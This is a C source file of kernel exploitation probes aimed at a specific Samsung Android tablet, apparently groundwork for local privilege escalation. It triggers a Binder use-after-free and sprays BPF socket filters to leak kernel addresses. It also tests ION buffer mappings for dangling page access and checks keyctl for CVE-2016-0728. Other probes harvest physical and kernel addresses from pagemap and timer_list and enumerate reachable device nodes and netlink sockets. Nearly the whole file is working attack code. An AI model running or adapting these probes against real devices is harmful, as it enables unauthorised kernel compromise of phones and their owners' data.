/*
 * priv_probe2.c — Novel exploitation probe: BPF readback, ION page UAF, keyctl
 *
 * TEST 1: SO_GET_FILTER BPF readback after multi-epoll close
 *   After closing epfd1, use getsockopt(SO_GET_FILTER) to read back
 *   the BPF instructions from each spray socket. Compare with original
 *   to detect which socket had its BPF data corrupted by list_del.
 *   This is a KERNEL ADDRESS LEAK if corruption detected.
 *
 * TEST 2: ION page-level UAF via mmap dangling reference
 *   ION uses remap_pfn_range for mmap (VM_PFNMAP). Test if:
 *   - mmap(dma_buf_fd) creates mapping
 *   - close(dma_buf_fd) + ION_IOC_FREE releases pages
 *   - userspace mapping STILL works (dangling!)
 *   - kernel reuses those pages → arbitrary R/W
 *
 * TEST 3: Keyring refcount overflow (CVE-2016-0728 check)
 *   Quick test if keyctl() is accessible and if refcount can overflow.
 *
 * TEST 4: pagemap physical address oracle
 *   Read /proc/self/pagemap to translate virtual→physical addresses.
 *   Combined with no-KASLR, gives complete memory layout knowledge.
 *
 * TEST 5: ION buffer page reclaim detection
 *   Free ION buffer, then check if physical pages get reused by kernel
 *   by comparing pagemap entries before/after allocation+free cycles.
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o priv_probe2 priv_probe2.c -lpthread
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <pthread.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

/* Binder */
#define BINDER_SET_MAX_THREADS _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT     _IOW('b', 8, int32_t)
#define BINDER_MMAP_SIZE       (128 * 1024)

/* ION */
#define ION_IOC_ALLOC  _IOWR('I', 0, struct ion_allocation_data)
#define ION_IOC_FREE   _IOWR('I', 1, struct ion_handle_data)
#define ION_IOC_SHARE  _IOWR('I', 4, struct ion_fd_data)

struct ion_allocation_data {
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    int handle;
};

struct ion_handle_data {
    int handle;
};

struct ion_fd_data {
    int handle;
    int fd;
};

/* Keyctl (syscall-based) */
#define KEYCTL_JOIN_SESSION_KEYRING 1
#define KEYCTL_REVOKE 3
#define KEYCTL_UNLINK 9
#define KEYCTL_DESCRIBE 6
#define KEY_SPEC_SESSION_KEYRING -3
#define KEY_SPEC_THREAD_KEYRING -1
#define KEY_SPEC_PROCESS_KEYRING -2
#define KEY_SPEC_USER_KEYRING -4

static int keyctl(int cmd, unsigned long a2, unsigned long a3,
                  unsigned long a4, unsigned long a5) {
    return syscall(__NR_keyctl, cmd, a2, a3, a4, a5);
}

static int add_key(const char *type, const char *desc, const void *payload,
                   size_t plen, int keyring) {
    return syscall(__NR_add_key, type, desc, payload, plen, keyring);
}

#define NUM_SPRAY 200
#define BPF_INSNS 26

static struct sock_filter orig_insns[BPF_INSNS];

static void init_canary_bpf(void) {
    /* Fill with unique per-instruction pattern so we can detect which byte changed */
    for (int i = 0; i < BPF_INSNS - 1; i++) {
        orig_insns[i] = (struct sock_filter){
            .code = BPF_LD | BPF_W | BPF_ABS,
            .jt = (uint8_t)(i & 0xFF),
            .jf = (uint8_t)((i >> 8) & 0xFF),
            .k = 0x41410000 | i
        };
    }
    orig_insns[BPF_INSNS - 1] = (struct sock_filter){ BPF_RET | BPF_K, 0, 0, 0xFFFF };
}

/* ========== TEST 1: SO_GET_FILTER BPF readback ========== */

static void test_bpf_readback(void) {
    printf("=== TEST 1: Multi-epoll + SO_GET_FILTER BPF readback ===\n");
    printf("  Detect kernel address leak via BPF instruction corruption\n\n");

    init_canary_bpf();

    int total_corrupted = 0;

    for (int trial = 0; trial < 10; trial++) {
        /* Do everything in this process for SO_GET_FILTER access */
        int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (bfd < 0) { printf("  binder open failed\n"); return; }
        mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
        uint32_t z = 0;
        ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

        /* 2 epolls */
        int epfd1 = epoll_create1(0);
        int epfd2 = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN };
        epoll_ctl(epfd1, EPOLL_CTL_ADD, bfd, &ev);
        epoll_ctl(epfd2, EPOLL_CTL_ADD, bfd, &ev);

        /* UAF */
        int32_t dummy = 0;
        ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

        /* Spray BPF with canary pattern */
        int spray_socks[NUM_SPRAY];
        struct sock_fprog prog = { .len = BPF_INSNS, .filter = orig_insns };
        int sprayed = 0;
        for (int i = 0; i < NUM_SPRAY; i++) {
            spray_socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
            if (spray_socks[i] < 0) break;
            if (setsockopt(spray_socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                          &prog, sizeof(prog)) == 0)
                sprayed++;
            else { close(spray_socks[i]); spray_socks[i] = -1; break; }
        }

        /* TRIGGER: close epfd1 → list_del should write kernel addr to BPF data */
        close(epfd1);

        /* READBACK: check each BPF filter for corruption */
        int found_corruption = 0;
        for (int i = 0; i < sprayed; i++) {
            struct sock_filter readback[BPF_INSNS];
            socklen_t optlen = sizeof(readback);
            /* SO_GET_FILTER = 26 */
            int rc = getsockopt(spray_socks[i], SOL_SOCKET, 26, readback, &optlen);
            if (rc < 0) continue;

            /* Compare with original */
            int changed = 0;
            for (int j = 0; j < BPF_INSNS; j++) {
                if (memcmp(&readback[j], &orig_insns[j], sizeof(struct sock_filter)) != 0) {
                    if (!found_corruption) {
                        printf("  [trial %d] CORRUPTION in socket %d, insn %d!\n", trial, i, j);
                        printf("    Original: code=0x%04x jt=%d jf=%d k=0x%08x\n",
                               orig_insns[j].code, orig_insns[j].jt, orig_insns[j].jf, orig_insns[j].k);
                        printf("    Got:      code=0x%04x jt=%d jf=%d k=0x%08x\n",
                               readback[j].code, readback[j].jt, readback[j].jf, readback[j].k);

                        /* The corrupted bytes might be a kernel address! */
                        uint32_t *raw = (uint32_t *)&readback[j];
                        printf("    Raw bytes: %08x %08x\n", raw[0], raw[1]);
                        if ((raw[0] & 0xC0000000) == 0xC0000000 ||
                            (raw[1] & 0xC0000000) == 0xC0000000) {
                            printf("    *** KERNEL ADDRESS LEAKED: 0x%08x or 0x%08x ***\n",
                                   raw[0], raw[1]);
                        }
                    }
                    changed++;
                    found_corruption = 1;
                }
            }
            if (changed > 0)
                printf("    → %d instructions corrupted in socket %d\n", changed, i);
        }

        if (found_corruption) total_corrupted++;
        else if (trial == 0)
            printf("  [trial %d] No corruption detected in %d sockets\n", trial, sprayed);

        /* Cleanup */
        close(epfd2);
        for (int i = 0; i < sprayed; i++) close(spray_socks[i]);
        close(bfd);
    }

    printf("  Result: %d/10 trials had BPF corruption\n\n", total_corrupted);
    if (total_corrupted > 0) {
        printf("  *** KERNEL ADDRESS LEAK CONFIRMED VIA BPF READBACK! ***\n\n");
    }
}

/* ========== TEST 2: ION page-level UAF ========== */

static void test_ion_page_uaf(void) {
    printf("=== TEST 2: ION page-level UAF via mmap dangling reference ===\n");

    int ion_fd = open("/dev/ion", O_RDWR);
    if (ion_fd < 0) { printf("  /dev/ion open failed\n\n"); return; }

    /* Step 1: Allocate ION buffer (heap 0, 4KB) */
    struct ion_allocation_data alloc = {
        .len = 4096,
        .align = 4096,
        .heap_id_mask = 1,  /* System heap (bit 0) */
        .flags = 0,
    };
    if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) {
        printf("  ION_IOC_ALLOC failed: %s\n", strerror(errno));
        /* Try heap 1 */
        alloc.heap_id_mask = 2;
        if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) {
            printf("  ION_IOC_ALLOC heap 1 failed: %s\n\n", strerror(errno));
            close(ion_fd);
            return;
        }
    }
    printf("  Allocated ION handle=%d\n", alloc.handle);

    /* Step 2: Get dma_buf fd */
    struct ion_fd_data share = { .handle = alloc.handle };
    if (ioctl(ion_fd, ION_IOC_SHARE, &share) < 0) {
        printf("  ION_IOC_SHARE failed: %s\n\n", strerror(errno));
        close(ion_fd);
        return;
    }
    int dma_fd = share.fd;
    printf("  Got dma_buf fd=%d\n", dma_fd);

    /* Step 3: mmap the dma_buf fd */
    void *mapping = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                         MAP_SHARED, dma_fd, 0);
    if (mapping == MAP_FAILED) {
        printf("  mmap(dma_buf) failed: %s\n\n", strerror(errno));
        close(dma_fd);
        close(ion_fd);
        return;
    }
    printf("  mmap at %p\n", mapping);

    /* Step 4: Write canary data */
    memset(mapping, 0x42, 4096);
    printf("  Wrote canary 0x42424242 to buffer\n");

    /* Read pagemap to get PFN */
    int pm = open("/proc/self/pagemap", O_RDONLY);
    if (pm >= 0) {
        uint64_t pme;
        off_t off = ((uintptr_t)mapping / 4096) * 8;
        if (pread(pm, &pme, 8, off) == 8) {
            uint64_t pfn = pme & 0x7FFFFFFFFFFFFF;
            int present = (pme >> 63) & 1;
            printf("  pagemap: PFN=0x%llx present=%d\n",
                   (unsigned long long)pfn, present);
            if (present && pfn > 0) {
                uint64_t phys = pfn * 4096;
                printf("  Physical addr: 0x%llx\n", (unsigned long long)phys);
                printf("  Kernel vaddr: 0x%llx (lowmem mapping)\n",
                       (unsigned long long)(phys - 0x20000000 + 0xC0000000));
            }
        }
        close(pm);
    }

    /* Step 5: Free ION handle (drops client reference) */
    struct ion_handle_data free_data = { .handle = alloc.handle };
    ioctl(ion_fd, ION_IOC_FREE, &free_data);
    printf("  ION_IOC_FREE done\n");

    /* Step 6: Close dma_buf fd (drops dma_buf reference) */
    close(dma_fd);
    printf("  close(dma_buf_fd) done\n");

    /* Step 7: Close ION client fd */
    close(ion_fd);
    printf("  close(ion_fd) done\n");

    /* Step 8: Check if mapping is still valid (DANGLING?) */
    printf("  Checking dangling mmap... ");
    fflush(stdout);

    /* Fork to avoid crashing main process */
    pid_t pid = fork();
    if (pid == 0) {
        alarm(3);
        volatile uint32_t *p = (volatile uint32_t *)mapping;
        uint32_t v = p[0];
        if (v == 0x42424242) {
            printf("STALE DATA (0x%08x) — pages not yet reclaimed\n", v);
        } else {
            printf("*** DATA CHANGED: 0x%08x — PAGE RECLAIMED! ***\n", v);
        }

        /* Try writing */
        p[0] = 0xDEADBEEF;
        v = p[0];
        printf("  After write: 0x%08x\n", v);

        /* Now allocate a bunch of pages to trigger page reclamation */
        printf("  Forcing page pressure... ");
        for (int i = 0; i < 100; i++) {
            void *tmp = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (tmp != MAP_FAILED) {
                memset(tmp, 'X', 4096);
                /* Don't unmap — keep the pressure */
            }
        }

        v = p[0];
        if (v != 0xDEADBEEF) {
            printf("*** DATA CHANGED AFTER PRESSURE: 0x%08x ***\n", v);
            printf("  *** ION PAGE UAF CONFIRMED! ***\n");
        } else {
            printf("still DEADBEEF (page not reclaimed yet)\n");
        }
        _exit(0);
    }

    int status;
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status)) {
        printf("  CRASH sig=%d — mapping became invalid\n", WTERMSIG(status));
    }

    /* Try to munmap the dangling mapping */
    munmap(mapping, 4096);
    printf("\n");
}

/* ========== TEST 2b: ION page UAF with large alloc ========== */

static void test_ion_page_uaf_large(void) {
    printf("=== TEST 2b: ION page UAF with larger buffer (64KB) ===\n");

    int ion_fd = open("/dev/ion", O_RDWR);
    if (ion_fd < 0) { printf("  /dev/ion open failed\n\n"); return; }

    struct ion_allocation_data alloc = {
        .len = 65536,
        .align = 4096,
        .heap_id_mask = 1,
        .flags = 0,
    };
    if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) {
        alloc.heap_id_mask = 2;
        if (ioctl(ion_fd, ION_IOC_ALLOC, &alloc) < 0) {
            printf("  ION_IOC_ALLOC failed\n\n");
            close(ion_fd); return;
        }
    }

    struct ion_fd_data share = { .handle = alloc.handle };
    ioctl(ion_fd, ION_IOC_SHARE, &share);
    int dma_fd = share.fd;

    void *mapping = mmap(NULL, 65536, PROT_READ | PROT_WRITE,
                         MAP_SHARED, dma_fd, 0);
    if (mapping == MAP_FAILED) {
        printf("  mmap failed\n\n");
        close(dma_fd); close(ion_fd); return;
    }

    /* Write known pattern */
    for (int i = 0; i < 65536/4; i++)
        ((uint32_t*)mapping)[i] = 0xC0FFEE00 | (i & 0xFF);

    printf("  Wrote pattern to 64KB mapping at %p\n", mapping);

    /* Get physical addresses */
    int pm = open("/proc/self/pagemap", O_RDONLY);
    if (pm >= 0) {
        printf("  Physical page frames:\n");
        for (int pg = 0; pg < 16; pg++) {
            uint64_t pme;
            off_t off = (((uintptr_t)mapping + pg * 4096) / 4096) * 8;
            if (pread(pm, &pme, 8, off) == 8) {
                uint64_t pfn = pme & 0x7FFFFFFFFFFFFF;
                int present = (pme >> 63) & 1;
                if (present)
                    printf("    page %2d: PFN=0x%06llx phys=0x%08llx\n",
                           pg, (unsigned long long)pfn,
                           (unsigned long long)(pfn * 4096));
            }
        }
        close(pm);
    }

    /* Free everything */
    struct ion_handle_data free_data = { .handle = alloc.handle };
    ioctl(ion_fd, ION_IOC_FREE, &free_data);
    close(dma_fd);
    close(ion_fd);
    printf("  ION buffer freed, dma_buf closed, ion_fd closed\n");

    /* Check dangling mapping */
    pid_t pid = fork();
    if (pid == 0) {
        alarm(3);
        volatile uint32_t *p = (volatile uint32_t *)mapping;

        /* Check each page */
        int pages_still_valid = 0;
        int pages_changed = 0;
        for (int pg = 0; pg < 16; pg++) {
            uint32_t expected = 0xC0FFEE00 | (pg * 1024 & 0xFF);
            uint32_t got = p[pg * 1024];
            if (got == expected) pages_still_valid++;
            else pages_changed++;
        }

        printf("  After free: %d pages unchanged, %d pages CHANGED\n",
               pages_still_valid, pages_changed);

        /* Do heavy allocations to force page reclamation */
        printf("  Heavy allocation pressure...\n");
        for (int i = 0; i < 1000; i++) {
            void *tmp = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (tmp != MAP_FAILED) memset(tmp, 'Z', 4096);
        }

        pages_still_valid = 0;
        pages_changed = 0;
        for (int pg = 0; pg < 16; pg++) {
            uint32_t expected = 0xC0FFEE00 | (pg * 1024 & 0xFF);
            uint32_t got = p[pg * 1024];
            if (got == expected) pages_still_valid++;
            else {
                pages_changed++;
                if (pages_changed == 1)
                    printf("  Page %d: expected 0x%08x got 0x%08x\n",
                           pg, expected, got);
            }
        }

        printf("  After pressure: %d unchanged, %d CHANGED\n",
               pages_still_valid, pages_changed);

        if (pages_changed > 0) {
            printf("  *** ION PAGE-LEVEL UAF CONFIRMED! ***\n");
            printf("  Can read/write kernel-reclaimed pages from userspace!\n");
        }
        _exit(0);
    }

    int status;
    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        printf("  CRASH sig=%d — pages reclaimed as non-readable\n", WTERMSIG(status));
    munmap(mapping, 65536);
    printf("\n");
}

/* ========== TEST 3: Keyctl probes ========== */

static void test_keyctl(void) {
    printf("=== TEST 3: Keyring subsystem probes ===\n");

    /* Test basic keyctl availability */
    char desc[256];
    int rc = keyctl(KEYCTL_DESCRIBE, KEY_SPEC_SESSION_KEYRING,
                    (unsigned long)desc, sizeof(desc), 0);
    printf("  Session keyring describe: rc=%d (%s)\n",
           rc, rc < 0 ? strerror(errno) : desc);

    /* Try to create a key */
    int key_id = add_key("user", "test_key", "payload", 7, KEY_SPEC_SESSION_KEYRING);
    printf("  add_key: id=%d (%s)\n", key_id, key_id < 0 ? strerror(errno) : "OK");

    if (key_id >= 0) {
        /* Quick CVE-2016-0728 detection: try joining session keyring repeatedly.
         * The vulnerable code doesn't decrement refcount on session join.
         * We won't actually overflow (would take 2^32 iterations) but we can
         * check if the refcount increases after many join operations. */
        printf("  Testing keyctl join_session (1000 iterations)...\n");
        for (int i = 0; i < 1000; i++) {
            keyctl(KEYCTL_JOIN_SESSION_KEYRING, (unsigned long)"test_session", 0, 0, 0);
        }
        printf("  No crash from 1000 session joins\n");

        /* Revoke the key */
        keyctl(KEYCTL_REVOKE, key_id, 0, 0, 0);
    }

    /* Test thread and process keyrings */
    rc = keyctl(KEYCTL_DESCRIBE, KEY_SPEC_THREAD_KEYRING,
                (unsigned long)desc, sizeof(desc), 0);
    printf("  Thread keyring: rc=%d (%s)\n", rc, rc < 0 ? strerror(errno) : "OK");

    rc = keyctl(KEYCTL_DESCRIBE, KEY_SPEC_PROCESS_KEYRING,
                (unsigned long)desc, sizeof(desc), 0);
    printf("  Process keyring: rc=%d (%s)\n", rc, rc < 0 ? strerror(errno) : "OK");

    rc = keyctl(KEYCTL_DESCRIBE, KEY_SPEC_USER_KEYRING,
                (unsigned long)desc, sizeof(desc), 0);
    printf("  User keyring: rc=%d (%s)\n", rc, rc < 0 ? strerror(errno) : "OK");

    printf("\n");
}

/* ========== TEST 4: pagemap physical address oracle ========== */

static void test_pagemap_oracle(void) {
    printf("=== TEST 4: pagemap physical address oracle ===\n");

    int pm = open("/proc/self/pagemap", O_RDONLY);
    if (pm < 0) {
        printf("  pagemap not readable: %s\n\n", strerror(errno));
        return;
    }

    /* Map a known page */
    void *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED) { close(pm); return; }
    *(volatile int*)page = 0xDEADBEEF;  /* Fault the page in */

    uint64_t pme;
    off_t off = ((uintptr_t)page / 4096) * 8;
    if (pread(pm, &pme, 8, off) == 8) {
        uint64_t pfn = pme & 0x7FFFFFFFFFFFFF;
        int present = (pme >> 63) & 1;
        int swapped = (pme >> 62) & 1;
        printf("  User page: vaddr=%p\n", page);
        printf("  pagemap entry: 0x%016llx\n", (unsigned long long)pme);
        printf("  Present=%d Swapped=%d PFN=0x%llx\n",
               present, swapped, (unsigned long long)pfn);
        if (present && pfn > 0) {
            uint64_t phys = pfn * 4096;
            printf("  Physical: 0x%llx\n", (unsigned long long)phys);
            printf("  Kernel lowmem vaddr: 0x%llx\n",
                   (unsigned long long)(phys - 0x20000000 + 0xC0000000));
        } else {
            printf("  WARNING: PFN=0 or not present — pagemap may be restricted\n");
        }
    }

    /* Also check the stack */
    int stack_var = 42;
    off = ((uintptr_t)&stack_var / 4096) * 8;
    if (pread(pm, &pme, 8, off) == 8) {
        uint64_t pfn = pme & 0x7FFFFFFFFFFFFF;
        int present = (pme >> 63) & 1;
        printf("  Stack page: vaddr=%p PFN=0x%llx present=%d\n",
               (void*)((uintptr_t)&stack_var & ~0xFFF),
               (unsigned long long)pfn, present);
    }

    /* Check code/text segment */
    off = ((uintptr_t)test_pagemap_oracle / 4096) * 8;
    if (pread(pm, &pme, 8, off) == 8) {
        uint64_t pfn = pme & 0x7FFFFFFFFFFFFF;
        int present = (pme >> 63) & 1;
        printf("  Code page: vaddr=%p PFN=0x%llx present=%d\n",
               (void*)((uintptr_t)test_pagemap_oracle & ~0xFFF),
               (unsigned long long)pfn, present);
    }

    munmap(page, 4096);
    close(pm);
    printf("\n");
}

/* ========== TEST 5: Samsung-specific device probes ========== */

struct dev_probe {
    const char *path;
    const char *desc;
};

static void test_samsung_devices(void) {
    printf("=== TEST 5: Samsung-specific device node probes ===\n");

    struct dev_probe devs[] = {
        { "/dev/s5p-smem", "Samsung secure memory" },
        { "/dev/alarm", "Android alarm" },
        { "/dev/ashmem", "Android shared memory" },
        { "/dev/uinput", "User input injection" },
        { "/dev/uhid", "User-space HID" },
        { "/dev/tun", "TUN/TAP" },
        { "/dev/vhost-net", "Vhost network" },
        { "/dev/loop0", "Loop device 0" },
        { "/dev/loop-control", "Loop control" },
        { "/dev/android_ssusbcon", "Samsung USB connector" },
        { "/dev/network_throughput", "Network throughput" },
        { "/dev/dek_req", "Samsung DEK (crypto)" },
        { "/dev/sdp_mm", "Samsung SDP memory" },
        { "/dev/mobicore-user", "MobiCore TEE" },
        { "/dev/mali0", "Mali GPU" },
        { "/dev/sec-nfc", "Samsung NFC" },
        { "/dev/pn547", "NFC PN547" },
        { "/dev/graphics/fb0", "Framebuffer" },
        { "/dev/input/event0", "Input event 0" },
        { "/dev/input/event1", "Input event 1" },
        { "/dev/block/mmcblk0", "eMMC block device" },
        { "/dev/video0", "Video capture 0" },
        { "/dev/media0", "Media device 0" },
        { NULL, NULL }
    };

    for (int i = 0; devs[i].path; i++) {
        int fd = open(devs[i].path, O_RDWR);
        if (fd >= 0) {
            printf("  %-30s OPEN OK (rw) fd=%d\n", devs[i].path, fd);
            /* Quick ioctl probe */
            unsigned long info;
            int rc = ioctl(fd, 0x80046101, &info);  /* Generic ioctl probe */
            close(fd);
        } else {
            int saved = errno;
            fd = open(devs[i].path, O_RDONLY);
            if (fd >= 0) {
                printf("  %-30s OPEN OK (ro)\n", devs[i].path);
                close(fd);
            } else {
                if (saved == ENOENT)
                    printf("  %-30s not found\n", devs[i].path);
                else
                    printf("  %-30s denied (%s)\n", devs[i].path, strerror(saved));
            }
        }
    }

    /* Probe netlink families */
    printf("\n  Netlink socket families:\n");
    const char *nl_names[] = {
        "ROUTE", "UNUSED", "USERSOCK", "FIREWALL", "SOCK_DIAG",
        "NFLOG", "XFRM", "SELINUX", "ISCSI", "AUDIT", "FIB_LOOKUP",
        "CONNECTOR", "NETFILTER", "IP6_FW", "DNRTMSG", "KOBJECT_UEVENT",
        "GENERIC", "DM", "SCSITRANSPORT", "ECRYPTFS", "RDMA", "CRYPTO"
    };
    for (int proto = 0; proto <= 21; proto++) {
        int sk = socket(AF_NETLINK, SOCK_RAW, proto);
        if (sk >= 0) {
            printf("  NL_%d (%-20s): OPEN OK\n", proto, nl_names[proto]);

            /* Try binding */
            struct {
                unsigned short family;
                unsigned short pad;
                unsigned int pid;
                unsigned int groups;
            } addr;
            memset(&addr, 0, sizeof(addr));
            addr.family = AF_NETLINK;
            addr.pid = 0;
            int brc = bind(sk, (void*)&addr, sizeof(addr));
            if (brc == 0) printf("                              → bound OK\n");
            close(sk);
        } else {
            if (errno != ENOENT && errno != EPROTONOSUPPORT)
                printf("  NL_%d (%-20s): %s\n", proto, nl_names[proto], strerror(errno));
        }
    }

    /* Try POSIX message queues */
    printf("\n  POSIX message queues:\n");
    int mqrc = syscall(__NR_mq_open, "/test_mq", O_CREAT | O_RDWR, 0666, NULL);
    printf("  mq_open: %d (%s)\n", mqrc, mqrc < 0 ? strerror(errno) : "OK");
    if (mqrc >= 0) {
        printf("  *** mq_open WORKS! Kernel message queue available ***\n");
        close(mqrc);
        syscall(__NR_mq_unlink, "/test_mq");
    }

    printf("\n");
}

/* ========== TEST 6: proc timer_list for kernel addr leak ========== */

static void test_timer_list(void) {
    printf("=== TEST 6: /proc/timer_list kernel address leak ===\n");

    int fd = open("/proc/timer_list", O_RDONLY);
    if (fd < 0) {
        printf("  Cannot open: %s\n\n", strerror(errno));
        return;
    }

    char buf[4096];
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) { printf("  No data\n\n"); return; }
    buf[n] = 0;

    /* Search for kernel addresses (0xc0xxxxxx pattern) */
    int addrs = 0;
    char *p = buf;
    while ((p = strstr(p, "0x")) != NULL) {
        unsigned long addr;
        if (sscanf(p, "0x%lx", &addr) == 1) {
            if (addr >= 0xC0000000 && addr < 0xF0000000) {
                if (addrs < 5) {
                    /* Find the line containing this address */
                    char *linestart = p;
                    while (linestart > buf && linestart[-1] != '\n') linestart--;
                    char *lineend = strchr(p, '\n');
                    if (lineend) {
                        *lineend = 0;
                        printf("  KERNEL ADDR: %s\n", linestart);
                        *lineend = '\n';
                    }
                }
                addrs++;
            }
        }
        p += 2;
    }

    printf("  Total kernel addresses found: %d\n", addrs);
    if (addrs > 0) {
        printf("  *** /proc/timer_list LEAKS KERNEL ADDRESSES! ***\n");
    }
    printf("\n");
}

int main(void) {
    printf("=== Novel Exploitation Probe v2 ===\n");
    printf("SM-T377A kernel 3.10.9, patch 2017-07\n");
    printf("PID=%d UID=%d\n\n", getpid(), getuid());

    alarm(300);

    test_bpf_readback();
    test_ion_page_uaf();
    test_ion_page_uaf_large();
    test_keyctl();
    test_pagemap_oracle();
    test_samsung_devices();
    test_timer_list();

    printf("=== Done ===\n");
    return 0;
}
